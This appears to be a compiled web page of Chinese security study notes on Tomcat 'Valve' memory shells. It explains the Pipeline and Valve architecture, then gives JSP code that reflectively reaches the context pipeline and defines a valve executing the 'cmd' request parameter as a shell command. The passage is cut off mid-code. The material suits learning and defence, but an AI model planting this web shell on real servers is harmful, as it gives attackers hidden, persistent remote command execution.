import{_ as e,c as l,J as i,m as s,a as n,V as p,o as d,E as a}from"./chunks/framework.WH0rnJL5.js";const r="/assets/image-20240129171852854._wfJPWNf.png",m=JSON.parse('{"title":"Valveå†…å­˜é©¬","description":"","frontmatter":{},"headers":[],"relativePath":"ç¬”è®°/ğŸ‘®ğŸ»ç½‘ç»œå®‰å…¨/Java/å†…å­˜é©¬/Tomcat/Valveå†…å­˜é©¬.md","filePath":"ç¬”è®°/ğŸ‘®ğŸ»ç½‘ç»œå®‰å…¨/Java/å†…å­˜é©¬/Tomcat/Valveå†…å­˜é©¬.md"}'),B={name:"ç¬”è®°/ğŸ‘®ğŸ»ç½‘ç»œå®‰å…¨/Java/å†…å­˜é©¬/Tomcat/Valveå†…å­˜é©¬.md"},o=s("h1",{id:"valveå†…å­˜é©¬",tabindex:"-1"},[n("Valveå†…å­˜é©¬ "),s("a",{class:"header-anchor",href:"#valveå†…å­˜é©¬","aria-label":'Permalink to "Valveå†…å­˜é©¬"'},"â€‹")],-1),g=p('<h2 id="_1-åŸºç¡€çŸ¥è¯†" tabindex="-1">1.åŸºç¡€çŸ¥è¯† <a class="header-anchor" href="#_1-åŸºç¡€çŸ¥è¯†" aria-label="Permalink to &quot;1.åŸºç¡€çŸ¥è¯†&quot;">â€‹</a></h2><blockquote><p><code>tomcat</code>ä¸­çš„<code>Container</code>æœ‰4ç§ï¼Œåˆ†åˆ«æ˜¯<code>Engine</code>ã€<code>Host</code>ã€<code>Context</code>å’Œ<code>Wrapper</code>ï¼Œè¿™<code>4</code>ä¸ª<code>Container</code>çš„å®ç°ç±»åˆ†åˆ«æ˜¯<code>StandardEngine</code>ã€<code>StandardHost</code>ã€<code>StandardContext</code>å’Œ<code>StandardWrapper</code>ã€‚<code>4</code>ç§å®¹å™¨çš„å…³ç³»æ˜¯åŒ…å«å…³ç³»ï¼Œ<code>Engine</code>åŒ…å«<code>Host</code>ï¼Œ<code>Host</code>åŒ…å«<code>Context</code>ï¼Œ<code>Context</code>åŒ…å«<code>Wrapper</code>ï¼Œ<code>Wrapper</code>åˆ™ä»£è¡¨æœ€åŸºç¡€çš„ä¸€ä¸ª<code>Servlet</code>ã€‚ <code>tomcat</code>ç”±<code>Connector</code>å’Œ<code>Container</code>ä¸¤éƒ¨åˆ†ç»„æˆï¼Œè€Œå½“ç½‘ç»œè¯·æ±‚è¿‡æ¥çš„æ—¶å€™<code>Connector</code>å…ˆå°†è¯·æ±‚åŒ…è£…ä¸º<code>Request</code>ï¼Œç„¶åå°†<code>Request</code>äº¤ç”±<code>Container</code>è¿›è¡Œå¤„ç†ï¼Œæœ€ç»ˆè¿”å›ç»™è¯·æ±‚æ–¹ã€‚è€Œ<code>Container</code>å¤„ç†çš„ç¬¬ä¸€å±‚å°±æ˜¯<code>Engine</code>å®¹å™¨ï¼Œä½†æ˜¯åœ¨<code>tomcat</code>ä¸­<code>Engine</code>å®¹å™¨ä¸ä¼šç›´æ¥è°ƒç”¨<code>Host</code>å®¹å™¨å»å¤„ç†è¯·æ±‚ï¼Œé‚£ä¹ˆè¯·æ±‚æ˜¯æ€ä¹ˆåœ¨<code>4</code>ä¸ªå®¹å™¨ä¸­æµè½¬çš„ï¼Œ4ä¸ªå®¹å™¨ä¹‹é—´æ˜¯æ€ä¹ˆä¾æ¬¡è°ƒç”¨çš„å‘¢ï¼Ÿ</p><p>åŸæ¥ï¼Œå½“è¯·æ±‚åˆ°è¾¾<code>Engine</code>å®¹å™¨çš„æ—¶å€™ï¼Œ<code>Engine</code>å¹¶éæ˜¯ç›´æ¥è°ƒç”¨å¯¹åº”çš„<code>Host</code>å»å¤„ç†ç›¸å…³çš„è¯·æ±‚ï¼Œè€Œæ˜¯è°ƒç”¨äº†è‡ªå·±çš„ä¸€ä¸ªç»„ä»¶å»å¤„ç†ï¼Œè¿™ä¸ªç»„ä»¶å°±å«åš<code>pipeline</code>ç»„ä»¶ï¼Œè·Ÿ<code>pipeline</code>ç›¸å…³çš„è¿˜æœ‰ä¸ªä¹Ÿæ˜¯å®¹å™¨å†…éƒ¨çš„ç»„ä»¶ï¼Œå«åš<code>valve</code>ç»„ä»¶ã€‚</p><p><code>Pipeline</code>çš„ä½œç”¨å°±å¦‚å…¶ä¸­æ–‡æ„æ€ä¸€æ ·â€”â€”ç®¡é“ï¼Œå¯ä»¥æŠŠä¸åŒå®¹å™¨æƒ³è±¡æˆä¸€ä¸ªç‹¬ç«‹çš„ä¸ªä½“ï¼Œé‚£ä¹ˆ<code>pipeline</code>å°±å¯ä»¥ç†è§£ä¸ºä¸åŒå®¹å™¨ä¹‹é—´çš„ç®¡é“ï¼Œé“è·¯ï¼Œæ¡¥æ¢ã€‚é‚£<code>Valve</code>è¿™ä¸ªç»„ä»¶æ˜¯ä»€ä¹ˆä¸œè¥¿å‘¢ï¼Ÿ<code>Valve</code>ä¹Ÿå¯ä»¥ç›´æ¥æŒ‰ç…§å­—é¢æ„æ€å»ç†è§£ä¸ºé˜€é—¨ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨ç”Ÿæ´»ä¸­å¯ä»¥çœ‹åˆ°æ¯ä¸ªç®¡é“ä¸Šé¢éƒ½æœ‰é˜€é—¨ï¼Œ<code>Pipeline</code>å’Œ<code>Valve</code>å…³ç³»ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚<code>Valve</code>ä»£è¡¨ç®¡é“ä¸Šçš„é˜€é—¨ï¼Œå¯ä»¥æ§åˆ¶ç®¡é“çš„æµå‘ï¼Œå½“ç„¶æ¯ä¸ªç®¡é“ä¸Šå¯ä»¥æœ‰å¤šä¸ªé˜€é—¨ã€‚å¦‚æœæŠŠ<code>Pipeline</code>æ¯”ä½œå…¬è·¯çš„è¯ï¼Œé‚£ä¹ˆ<code>Valve</code>å¯ä»¥ç†è§£ä¸ºå…¬è·¯ä¸Šçš„æ”¶è´¹ç«™ï¼Œè½¦ä»£è¡¨<code>Pipeline</code>ä¸­çš„å†…å®¹ï¼Œé‚£ä¹ˆæ¯ä¸ªæ”¶è´¹ç«™éƒ½ä¼šå¯¹å…¶ä¸­çš„å†…å®¹åšä¸€äº›å¤„ç†ï¼ˆæ”¶è´¹ï¼ŒæŸ¥è¯ä»¶ç­‰ï¼‰ã€‚</p><p>åœ¨<code>Catalina</code>ä¸­ï¼Œ<code>4</code>ç§å®¹å™¨éƒ½æœ‰è‡ªå·±çš„<code>Pipeline</code>ç»„ä»¶ï¼Œæ¯ä¸ª<code>Pipeline</code>ç»„ä»¶ä¸Šè‡³å°‘ä¼šè®¾å®šä¸€ä¸ª<code>Valve</code>ï¼Œè¿™ä¸ª<code>Valve</code>æˆ‘ä»¬ç§°ä¹‹ä¸º<code>BaseValve</code>ï¼Œä¹Ÿå°±æ˜¯åŸºç¡€é˜€ã€‚åŸºç¡€é˜€çš„ä½œç”¨æ˜¯è¿æ¥å½“å‰å®¹å™¨çš„ä¸‹ä¸€ä¸ªå®¹å™¨ï¼ˆé€šå¸¸æ˜¯è‡ªå·±çš„è‡ªå®¹å™¨ï¼‰ï¼Œå¯ä»¥è¯´åŸºç¡€é˜€æ˜¯ä¸¤ä¸ªå®¹å™¨ä¹‹é—´çš„æ¡¥æ¢ã€‚</p><p><code>Pipeline</code>å®šä¹‰å¯¹åº”çš„æ¥å£<code>Pipeline</code>ï¼Œæ ‡å‡†å®ç°äº†<code>StandardPipeline</code>ã€‚<code>Valve</code>å®šä¹‰å¯¹åº”çš„æ¥å£<code>Valve</code>ï¼ŒæŠ½è±¡å®ç°ç±»<code>ValveBase</code>ï¼Œ<code>4</code>ä¸ªå®¹å™¨å¯¹åº”åŸºç¡€é˜€é—¨åˆ†åˆ«æ˜¯<code>StandardEngineValve</code>ï¼Œ<code>StandardHostValve</code>ï¼Œ<code>StandardContextValve</code>ï¼Œ<code>StandardWrapperValve</code>ã€‚åœ¨å®é™…è¿è¡Œä¸­ï¼Œ<code>Pipeline</code>å’Œ<code>Valve</code>è¿è¡Œæœºåˆ¶å¦‚ä¸‹å›¾ï¼š</p></blockquote><p><img src="'+r+`" alt="img"></p><h2 id="_2-åŸç†åˆ†æ" tabindex="-1">2.åŸç†åˆ†æ <a class="header-anchor" href="#_2-åŸç†åˆ†æ" aria-label="Permalink to &quot;2.åŸç†åˆ†æ&quot;">â€‹</a></h2><h2 id="_3-ä»£ç å®ç°" tabindex="-1">3.ä»£ç å®ç° <a class="header-anchor" href="#_3-ä»£ç å®ç°" aria-label="Permalink to &quot;3.ä»£ç å®ç°&quot;">â€‹</a></h2><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki shiki-themes github-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">&lt;%</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">@</span><span style="--shiki-light:#D73A49;--shiki-dark:#E5C07B;"> page</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> import</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">&quot;java.lang.reflect.Field&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;"> %&gt;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">&lt;%</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">@</span><span style="--shiki-light:#D73A49;--shiki-dark:#E5C07B;"> page</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> import</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">&quot;org.apache.catalina.connector.Request&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;"> %&gt;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">&lt;%</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">@</span><span style="--shiki-light:#D73A49;--shiki-dark:#E5C07B;"> page</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> import</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">&quot;org.apache.catalina.core.StandardContext&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;"> %&gt;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">&lt;%</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">@</span><span style="--shiki-light:#D73A49;--shiki-dark:#E5C07B;"> page</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> import</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">&quot;org.apache.catalina.core.ContainerBase&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;"> %&gt;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">&lt;%</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">@</span><span style="--shiki-light:#D73A49;--shiki-dark:#E5C07B;"> page</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> import</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">&quot;org.apache.catalina.core.StandardPipeline&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;"> %&gt;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">&lt;%</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">@</span><span style="--shiki-light:#D73A49;--shiki-dark:#E5C07B;"> page</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> import</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">&quot;org.apache.catalina.valves.ValveBase&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;"> %&gt;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">&lt;%</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">@</span><span style="--shiki-light:#D73A49;--shiki-dark:#E5C07B;"> page</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> import</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">&quot;org.apache.catalina.connector.Response&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;"> %&gt;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">&lt;%</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">@</span><span style="--shiki-light:#D73A49;--shiki-dark:#E5C07B;"> page</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> import</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">&quot;java.io.IOException&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;"> %&gt;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">&lt;%</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">@</span><span style="--shiki-light:#D73A49;--shiki-dark:#E5C07B;"> page</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> import</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">&quot;java.io.InputStream&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;"> %&gt;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">&lt;%</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">@</span><span style="--shiki-light:#D73A49;--shiki-dark:#E5C07B;"> page</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> import</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">&quot;java.util.Scanner&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;"> %&gt;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">&lt;%</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">    Field</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> requestField </span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;"> request</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">getClass</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">().</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">getDeclaredField</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">&quot;request&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">    requestField</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">setAccessible</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#D19A66;">true</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">    Request</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> request1 </span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> (Request) </span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">requestField</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">get</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">(request);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">    StandardContext</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> standardContext </span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> (StandardContext) </span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">request1</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">getContext</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">();</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">    Field</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> containerBasePipeline </span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;"> ContainerBase</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">class</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">getDeclaredField</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">&quot;pipeline&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">    containerBasePipeline</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">setAccessible</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#D19A66;">true</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">    StandardPipeline</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> standardPipeline </span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> (StandardPipeline) </span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">containerBasePipeline</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">get</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">(standardContext);</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">    ValveBase</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> valveBase </span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#D73A49;--shiki-dark:#C678DD;"> new</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;"> ValveBase</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;">() {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">        @</span><span style="--shiki-light:#D73A49;--shiki-dark:#E5C07B;">Override</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#C678DD;">        public</span><span style="--shiki-light:#D73A49;--shiki-dark:#C678DD;"> void</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;"> invoke</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">Request</span><span style="--shiki-light:#E36209;--shiki-dark:#E06C75;--shiki-light-font-style:inherit;--shiki-dark-font-style:italic;"> request</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">Response</span><span style="--shiki-light:#E36209;--shiki-dark:#E06C75;--shiki-light-font-style:inherit;--shiki-dark-font-style:italic;"> response</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">)</span><span style="--shiki-light:#D73A49;--shiki-dark:#C678DD;"> throws</span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;"> IOException</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;"> ServletException</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#C678DD;">            if</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">request</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">getParameter</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">&quot;cmd&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">!=</span><span style="--shiki-light:#005CC5;--shiki-dark:#D19A66;"> null</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;"> ){</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#C678DD;">                boolean</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> isLinux</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#005CC5;--shiki-dark:#D19A66;"> true</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">                String</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> os</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;"> System</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">getProperty</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">&quot;os.name&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#C678DD;">                if</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;"> (os </span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">!=</span><span style="--shiki-light:#005CC5;--shiki-dark:#D19A66;"> null</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;"> &amp;&amp;</span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;"> os</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">toLowerCase</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">().</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">contains</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">&quot;win&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">)) {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">                    isLinux </span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#D19A66;"> false</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">                }</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#E5C07B;">                String</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">[] </span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;">exp</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;"> isLinux </span><span style="--shiki-light:#D73A49;--shiki-dark:#C678DD;">?</span><span style="--shiki-light:#D73A49;--shiki-dark:#C678DD;"> new</span><span style="--shiki-light:#D73A49;--shiki-dark:#E5C07B;"> String</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">[]{</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">&quot;sh&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">&quot;-c&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">request</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">getParameter</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">&quot;cmd&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">)} </span><span style="--shiki-light:#D73A49;--shiki-dark:#C678DD;">:</span><span style="--shiki-light:#D73A49;--shiki-dark:#C678DD;"> new</span><span style="--shiki-light:#D73A49;--shiki-dark:#E5C07B;"> String</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">[]{</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">&quot;cmd.exe&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">&quot;/c&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">request</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">getParameter</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">&quot;cmd&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">)};</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">                InputStream</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> inputStream</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;"> Runtime</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">getRuntime</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">().</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">exec</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">(exp).</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">getInputStream</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">();</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">                Scanner</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> s</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#D73A49;--shiki-dark:#C678DD;"> new</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;"> Scanner</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">(inputStream).</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">useDelimiter</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">A&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">                String</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> output</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;"> s</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">hasNext</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">() </span><span style="--shiki-light:#D73A49;--shiki-dark:#C678DD;">?</span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;"> s</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">next</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">() </span><span style="--shiki-light:#D73A49;--shiki-dark:#C678DD;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;"> &quot;&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">;</span></span>
